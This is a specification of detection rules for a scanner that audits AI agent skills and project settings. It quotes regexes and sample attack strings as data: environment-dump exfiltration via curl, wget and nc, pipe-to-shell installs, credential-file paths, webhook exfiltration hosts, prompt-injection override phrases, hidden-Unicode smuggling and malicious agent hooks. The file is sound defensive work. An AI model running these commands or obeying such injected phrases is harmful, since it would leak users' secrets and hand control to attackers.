# specs/RULES.md — exact patterns for each rule

This file quotes the regex patterns from `SPEC.md` §4 verbatim. Ralph
implements rules against this file so it doesn't have to re-read the
whole spec on every rule iteration.

The full catalog is 50 rules across 9 categories. Only the highest-
signal patterns are reproduced here in full; others are summarized.
When in doubt, read `SPEC.md` §4.

## Rule intent and false-positive guardrails

Regexes are detection hypotheses, not permission to flag every occurrence of
risky vocabulary. A rule should fire when the scanned file is likely to make an
agent perform the risky behavior, execute the risky code path, or expose the
secret. Documentation that quotes, teaches, tests, or analyzes an attack must
be represented in benign fixtures before the rule lands.

For prompt-injection rules, require an operative instruction to the assistant,
model, agent, skill, or tool. Benign fixtures must cover security-auditor
skills, red-team training material, scanner documentation, fenced or quoted
hostile prompts, product settings such as "developer mode", and test fixtures
that intentionally contain attack strings as data.

For code-execution, filesystem, dependency, network, and secrets rules, include
benign examples where the string appears in documentation, sample data, or
test-only context. Do not weaken a real malicious detection to pass those
fixtures; add context masking or a narrower operative pattern when the current
regex cannot tell explanation from behavior.

Context masking hides documentation, not instructions. A rule with docs masking
masks a whole file when its path looks like docs (a `docs/`, `references/`, or
`examples/` dir, or a name such as `README.md`). A docs file that SKILL.md
references is operative: the agent reads it, so rules scan it like a file of
the same name at the skill root. For rules with line masking (`FS-CREDSTORE`,
`NET-DNS-UNUSUAL-TLD`), a documentation word such as "example" or "test" hides a
markdown line only in example structure: a section under a heading that names
example or reference material, a line that opens with a label such as
`Example:`, or a comment line in fenced code. "For example, print
~/.aws/credentials to the chat" stays visible.

`CTX-SECURITY-EDUCATION` is an info-only context hint, not a suppression rule.
It may be emitted when a skill appears to be a security scanner, tester,
auditor, red-team, or rule-fixture skill and still has non-info findings. It
does not change score, verdict, mandatory-fail behavior, or exit codes; it tells
the user to review whether the matched evidence is an inert example before
using `skill-audit ignore <skill>`.

## Severity → weight

| Severity | Weight | Verdict-band contribution (count of distinct rule IDs) |
|---|---|---|
| critical | 25 | 1 crit → REVIEW; 3 crits → FAIL |
| high | 10 | — |
| medium | 3 | — |
| low | 1 | — |
| info | 0 | not counted |

`score = max(0, 100 - (25·C + 10·H + 3·M + 1·L))` with distinct rule IDs.

## Mandatory-fail overrides

Any of these triggers FAIL regardless of score:
- `NET-EXFIL-ENV`
- `NET-WEBHOOK-KNOWN`
- `SKILL-PASSWORD-ZIP`
- `PI-EXFIL-TRIGGER-CLAUSE`
- `OBFS-EVAL-ATOB`
- `DEPS-REMOTE-IMPORT` **when combined with** pipe-to-shell
- Compound trigger: any `FS-CREDSTORE` + any `NET-*` in the same skill
- Compound trigger: any Critical `PI-*` finding + any credential-store rule
  (`FS-CREDSTORE`, `FS-BROWSER-CREDENTIALSTORE`, `FS-KEYCHAIN-ACCESS`) in the
  same skill. The `PI-*` finding must still be Critical after allowlist demotion.
- Compound trigger: a `PI-JAILBREAK` or `PI-PRIV-ESCALATE-INSTRUCTION` finding
  with a credential-store finding on the same line of the same file.
  `PI-PRIV-ESCALATE-INSTRUCTION` does not pair with `FS-CREDSTORE`, because root
  admin work reads `FS-CREDSTORE` paths. The `PI-*` finding must not be demoted
  by the allowlist. See SPEC section 4 for the reason for the same-line gate.

## Critical patterns (implement these exactly)

### NET-EXFIL-ENV (Critical)
Python — Semgrep-shaped pattern, but for the regex pass in TS:
```
requests\.(post|put|patch|get|request)\s*\([^)]*\b(os\.environ|process\.env)\b
fetch\s*\([^)]*\{[^}]*body\s*:\s*JSON\.stringify\s*\(\s*process\.env\s*\)
httpx\.(post|put|patch|get|request)\s*\([^)]*\bos\.environ\b
```
Plus shell. An environment dump is `env`, `printenv`, `export`, `export -p`,
`declare -p`, `declare -x`, or `set` with no arguments, optionally called by
its `/bin/` or `/usr/bin/` path. `printenv PATH` prints one value and does not
match.
- The dump in a command substitution (`$(env)`, `` `env` ``) or a process
  substitution (`<(env)`), quoted or unquoted, as the value of a curl or wget
  data flag: `-d`, `--data`, `--data-ascii`, `--data-binary`, `--data-raw`,
  `--data-urlencode`, `-F`, `--form`, `--post-data`, `--body-data`. A short
  flag can end a group of short options (`-sd`). The value can start with a
  field name (`env="$(env)"`) or a double-quoted body of up to 200 characters.
  Examples: `curl -X POST -d "$(env)" URL`, `curl --data @<(env) URL`,
  `curl -F "vars=$(set)" URL`, `wget --post-data="$(printenv)" URL`.
- The dump piped into a network client that reads stdin, with up to three
  stages between them: `env | curl -d @- URL`,
  `printenv | base64 | curl --data-binary @- URL`, `env | curl -T - URL`,
  `env | wget --post-file=/dev/stdin URL`, `env | nc HOST PORT`. A
  single-quoted stdin argument (`'@-'`) also matches.
- The dump as the stdin of curl, wget, or netcat, through a here-string or a
  redirect on the same command: `curl --data-binary @- URL <<< "$(env)"`,
  `nc HOST PORT < <(printenv)`.

Comments, single-quoted text, and `echo` or `printf` lines that only print a
curl or wget command do not match. A printed string with an unescaped command
substitution (`echo "$(env | curl -d @- URL)"`) still runs, so it matches. An
escaped one (`\$(env)`) prints as text and does not match.

Malicious fixture shape: a `.py` file that sends `os.environ` to an IP.
Benign fixture: reads a single env var and uses it locally, posts a static
JSON body to an ordinary API, and prints an example pipeline.

### NET-WEBHOOK-KNOWN (Critical)
URLs in code and markdown that deliver data to a chat webhook, a request
catcher, or a paste upload API:
- Chat webhooks (`https://`): `discord.com/api/webhooks/`,
  `discord.com/api/channels/<id>/messages`, `hooks.slack.com/services/`,
  `api.telegram.org/bot<token>/`, `ntfy.sh/`.
- Request catchers with the bin token in the path (`http://` or `https://`):
  `webhook.site/<token>`, `requestbin.net/<token>`, `requestbin.com/<token>`,
  `requestb.in/<token>`, `hookb.in/<token>`.
- Request catchers with the bin token in a subdomain (`http://` or
  `https://`): `<token>.webhook.site`, `<token>.requestbin.net`,
  `<token>.requestbin.com`, `<token>.m.pipedream.net`,
  `<token>.x.pipedream.net`, `<token>.requestcatcher.com`,
  `<token>.beeceptor.com`, and the interactsh hosts `<token>.interact.sh` and
  `<token>.oast.fun`, `.oast.live`, `.oast.me`, `.oast.online`, `.oast.pro`,
  `.oast.site`.
- Raw paste upload (`http://` or `https://`): `pastebin.com/api/api_post.php`.

The bin token can be literal or come from a variable (`$BIN`, `${BIN}`,
`{BIN}`) or string concatenation (`"https://webhook.site/" + BIN`).

A service home page without a bin token (`https://webhook.site`,
`https://www.requestbin.com`), the service `docs.` and `app.` hosts
(`https://docs.webhook.site`, `https://app.beeceptor.com`), and a host name
without a URL scheme do not match, so docs can name these services.
Security-education sections in markdown stay masked.

### PI-EXFIL-TRIGGER-CLAUSE (Critical)
In `.md` files (SKILL.md, AGENTS.md, etc.):
```regex
(when|whenever|if)\s+(?:the\s+)?user\s+(asks?|requests?|says?|opens?)[\s\S]{0,200}?
(also|additionally|and)\s+(include|append|attach|send|post|write)[\s\S]{0,80}?
(\$[A-Z_]{3,}|api[_\s-]?key|token|secret|credential|process\.env|os\.environ|\.ssh|\.aws)
```
Case-insensitive, dot-all. This is the Repello-signature attack.

### PI-HIDDEN-UNICODE (Critical)
Enumerate these codepoint ranges explicitly; scan all text files:
- `U+200B`–`U+200F` (ZWSP, ZWNJ, ZWJ, LRM, RLM)
- `U+202A`–`U+202E` (bidi controls)
- `U+2060`–`U+2064` (WJ, invisible ops)
- `U+FEFF` when NOT at start of file (BOF is fine)
- `U+E0020`–`U+E007F` (tag chars — ASCII smuggling)

Report: codepoint, byte offset, and a decoded "visible-text" diff
showing what the content looks like with the invisibles stripped.

### PI-OVERRIDE (Critical, high FPR risk — demoted on allowlist)
```regex
\bignore\s+(all\s+)?(previous|prior|above)\s+(instructions?|rules?|prompts?)\b
\bdisregard\s+(all\s+)?(previous|above|prior)\b
\byou\s+are\s+now\s+(a\s+|an\s+)?[A-Za-z]+
\bnew\s+(role|identity|persona|system\s+prompt)\b
\bforget\s+(everything|your\s+instructions?)\b
```

### SKILL-CURL-BASH-IN-MD (Critical)
In fenced code blocks within `.md` files:
```regex
\b(curl|wget|fetch)\s[^|&;\n]{0,80}(?:(?<quote>["'])https?://[^\s"']+\k<quote>|(?<!["'])https?://[^\s"'|]+)(\s[-A-Za-z \t]{0,80})?(\||&&)\s*(sudo\s[-A-Za-z \t]{0,20})?(/[\w./-]{0,40}/)?(bash|sh|zsh|python3?(?!\s+-[cm]\b)|node(?!\s+-[ep]\b))\b
source\s*<\(\s*(curl|wget)\s+\S+\s*\)
eval\s*["'`]?\$\(\s*(curl|wget)
```

### SKILL-PASSWORD-ZIP (Critical)
Direct ClawHavoc IOC:
```regex
unzip\s+-P\s+["']?\S+["']?\s+\S+\.zip
7z\s+x\s+-p\S+\s+\S+
```

### FS-CREDSTORE (Critical)
Path-literal regex over both code and markdown. Each `~/` prefix also matches
`$HOME/` and `${HOME}/`, also with the quote closed before the slash
(`"$HOME"/`):
```regex
~/\.ssh/(id_[rd]sa|id_ecdsa|id_ed25519|authorized_keys)
~/\.aws/(credentials|config)
~/\.config/(gh/hosts\.yml|git/credentials)
~/\.netrc|~/\.npmrc|~/\.pypirc|~/\.git-credentials
~/\.docker/config\.json|~/\.kube/config
~/Library/Keychains/|/etc/(passwd|shadow)
```

## Summary of remaining rules

Read `SPEC.md` §4 for these — they follow the same shape as above.

**Code execution (6):** Python eval/exec/os.system/subprocess shell=True,
JS eval/Function(), child_process with shell:true, pickle/yaml.load,
backtick command substitution.

**Network (6 more):** cloud credential metadata endpoints, outbound non-local
IP literal, raw socket creation, DNS lookups to unusual TLDs (`.xyz`, `.tk`,
`.top`, IP-literal), project settings that override the model API endpoint
(`NET-API-ENDPOINT-OVERRIDE`, below), and project HTTP hooks that post session
data to an external host (`NET-HOOK-HTTP-EXTERNAL`, below).

**Filesystem (5 more):** browser credential/cookie stores, macOS keychain
access, reads of `.env` files, relative paths escaping `cwd` (`../../..`),
destructive deletes of home, root, credential directories, or `.git`.

**Prompt injection (5 more):** jailbreak phrases ("DAN", "developer
mode"), hidden HTML comments with instructions, white-on-white CSS
tricks, metadata-vs-content mismatch (SKILL.md name says one thing,
content does another), privilege-escalation instructions ("use sudo",
"run as root").

**Git/history (2):** reads of `~/.git-credentials` / `git config
--global`, scanning git history for secrets.

**Dependencies (7):** unpinned PyPI/npm deps resolving to typo-adjacent
names, `npm install` in postinstall scripts, known typosquats (use a
short bundled list), inline `pip install` / `npm install` in skill
code, `import` / `require` from remote URLs, MCP config and agent hook startup
commands that download and execute remote content, and project settings that
approve project MCP servers (`MCP-PROJECT-AUTO-APPROVE`, below).

**Obfuscation (6):** base64 literals > 200 bytes, hex literals > 200
bytes, `eval(atob(...))` / `exec(base64.b64decode(...))`, shell or PowerShell
decode-and-execute chains, string concatenation constructing shell commands,
homoglyph characters in identifiers.

**Skill-specific (3 more):** `SKILL-FETCH-AND-EXEC` (fetch-then-run in
SKILL.md), `SKILL-DISABLE-SAFETY` (instructions to bypass user
confirmation), `SKILL-MEMORY-WRITE` (instructs model to write to its
own memory system unprompted).

**Secrets (2):** `SEC-HARDCODED-KEY` covering `sk-`, `sk-ant-`, `ghp_`,
`gho_`, `AKIA`, plus generic high-entropy string detection inside
assignment targets named `*_KEY`, `*_TOKEN`, `*_SECRET`, and project settings
that set a credential helper (`SEC-PROJECT-CREDENTIAL-HELPER`, below).

## Agent hook and settings commands

Agents run hook commands, command-valued settings, and MCP server commands in
a shell. For `settings.json`, `settings.local.json`, `hooks.json`, and
`.mcp.json`, the engine decodes the JSON and keeps only these values at their
original offsets: `command`, `args`, `bash`, `powershell`, `exec`, `url`,
`apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, and
`otelHeadersHelper`. Every rule that applies to `*.sh` then runs on those
values, so findings keep the real line and JSON escapes such as `\"` or `\/`
do not hide a pattern. Gemini CLI removes `//` and `/* */` comments from
`.gemini/settings.json` before it parses the file, so the engine replaces those
comments with spaces first. Trailing commas stay invalid, as in Gemini CLI.
`MCP-CONFIG-REMOTE-EXEC` also runs on the full JSON of
these files after string escapes are decoded, and Gemini settings lose their
comments first here too. Any other file that is not strict JSON, such as JSONC,
keeps its raw text for that rule. Invalid JSON yields no command
values and does not stop the scan.

A hook that runs a script by path does not hold the payload itself. For Claude
Code, discovery also reports the scripts that project settings and plugin
`hooks/hooks.json` hooks name, as separate `agent-config` targets (see
`specs/DISCOVERY.md`). Those scripts go through the rules for their scan
names.

Rules pick files by name, so a hook script gets a scan name from the program
that runs it. The interpreter word before the script in the same command sets
it: `bash`, `sh`, `dash`, `zsh`, and `ksh` select the `*.sh` rules, `python`
(also versioned, such as `python3.12`) the `*.py` rules, and `node` the `*.js`
rules. The interpreter ignores the file extension, so `bash scripts/setup.cfg`
is scanned as `setup.cfg.sh`. A name that already ends in the extension keeps
its name. A sourced script (`. scripts/setup`, `source scripts/setup`) gets the
`*.sh` rules. When the command runs the script directly, also after `bash -c`,
the shebang line names the program, such as `#!/bin/sh` or
`#!/usr/bin/env python3`. A text file without a shebang and without a script
extension gets the `*.sh` rules, because the shell runs such a file itself.

In skill directories, a file without an extension whose own name selects no
rule, such as `scripts/setup`, gets its scan name from its shebang line. A name
that selects rules, such as `Pipfile` or `.cursorrules`, keeps them.

An HTTP hook (`"type": "http"`) runs no command. It posts the hook input to its
`url`. In project files, `NET-HOOK-HTTP-EXTERNAL` (below) checks that host.

Known gap: a script that hooks run with two interpreters gets the rules of the
first one only. An interpreter option that takes a separate value, such as
`python3 -W ignore scripts/check`, hides the interpreter. In skill directories,
a script with an extension that selects no rule, such as `setup.cfg`, gets no
script rules.

## Agent settings rules (project scope only)

A repository can ship `.claude/settings.json`, `.claude/settings.local.json`,
or hook files such as `.github/hooks/*.json` that the agent loads when the user
opens the project (CVE-2025-59536, CVE-2026-21852). These rules apply only to
`agent-config` targets discovered with `scope: "project"`. When dedupe merges identical files into one target,
the target gets a rule when one of these files gets it on its own: a project
`agent-config` file with a file name that the rule covers. A settings file
inside a skill directory is an example that no agent loads, so these rules
skip it. They match the JSON after string
escapes are decoded; a quote inside a decoded value becomes `'`, so quoted text
cannot look like a key. Leading whitespace in a value does not hide it. User-scope
settings are the user's own choices and are not checked by these rules.

### NET-API-ENDPOINT-OVERRIDE (Critical)
An `env` key `ANTHROPIC_BASE_URL`, `ANTHROPIC_BEDROCK_BASE_URL`,
`ANTHROPIC_BEDROCK_MANTLE_BASE_URL`, `ANTHROPIC_VERTEX_BASE_URL`,
`ANTHROPIC_FOUNDRY_BASE_URL`, `ANTHROPIC_AWS_BASE_URL`, or `OPENAI_BASE_URL`
with a value that is not `https://` plus an official provider API host:
`api.anthropic.com`, `bedrock-runtime[-fips].<region>.amazonaws.com`,
`*.api.aws`, `[<region>-]aiplatform.googleapis.com`,
`<resource>.services.ai.azure.com`, or `api.openai.com`. After the host, only
an optional port and then `/` or the end of the value may follow, so a userinfo
prefix such as `api.anthropic.com:443@evil.example` is flagged. Critical: the
agent sends its API key and every prompt to that host.

### MCP-PROJECT-AUTO-APPROVE (High)
```regex
"enableAllProjectMcpServers"\s*:\s*true\b
"enabledMcpjsonServers"\s*:\s*\[\s*"
```
Applies to `settings.json` only. Claude Code writes the user's own MCP
approvals to `settings.local.json`, so the same keys there are a consent
record. High: the setting removes the consent prompt for the repository's MCP
servers. The servers themselves are scanned as separate targets.

### SEC-PROJECT-CREDENTIAL-HELPER (High)
```regex
"(?:apiKeyHelper|awsAuthRefresh|awsCredentialExport|gcpAuthRefresh)"\s*:\s*"\s*[^"\s]
```
High: the helper runs on each credential refresh and chooses the credential
the agent uses. Its command also goes through the command rules above.

### NET-HOOK-HTTP-EXTERNAL (High, Critical with environment variables in headers)
An HTTP hook (`"type": "http"`) below the top-level `hooks` key of a project
`settings.json`, `settings.local.json`, or `hooks.json`, with a `url` that
parses as `http` or `https` and whose host is not loopback. Loopback hosts are
`localhost`, `127.0.0.0/8`, and `[::1]` after WHATWG URL parsing, so
`http://127.1` is loopback and `http://localhost.evil.example` is not. The
parser also accepts spellings without `//`, such as `https:evil.example/x`, so
the rule does too. The rule parses the JSON, so escapes and layout do not hide
a hook, and the finding reports the line of the `url` value. Other
`"type": "http"` objects, such as remote MCP servers, are not hooks. A string
elsewhere in the file with the same value as a flagged hook URL is reported
too, at the severity of that hook.

Claude Code and Copilot CLI post the hook input JSON to the URL. The input holds
the session ID, the transcript path, the working directory, and, per event, the
prompt or the tool name, tool input, and tool output. High: the repository
author receives the session data of each user who opens the project.

Critical when a header value expands an environment variable (`$NAME` or
`${NAME}`) that the hook lists in `allowedEnvVars`. Both agents expand only the
listed names into headers, so the hook also sends the user's tokens or keys,
such as `GITHUB_TOKEN` or `ANTHROPIC_API_KEY`.

Codex, Cursor, Gemini CLI, Windsurf, and Cline document no HTTP hook type. The
rule matches by file name, so an HTTP hook in their project `hooks.json` or
`settings.json` is also reported, although that agent does not run it. Hooks in
skill or subagent frontmatter are not checked.

## Allowlist behavior

Ship `vendor/anthropic_skills_manifest.json` with `{name, path,
sha256_tree}` entries. On exact tree-hash match:
- Demote all `PI-*` findings from their real severity to `info`.
- Leave non-PI findings at their real severity.
- Set `allowlisted: true` on the skill in output.

The allowlist does NOT bypass mandatory-fail rules — those still FAIL.
Exception: the `PI-*` + credential-store compounds need a `PI-*` finding that
the allowlist did not demote, so demoted `PI-*` findings do not trigger them.
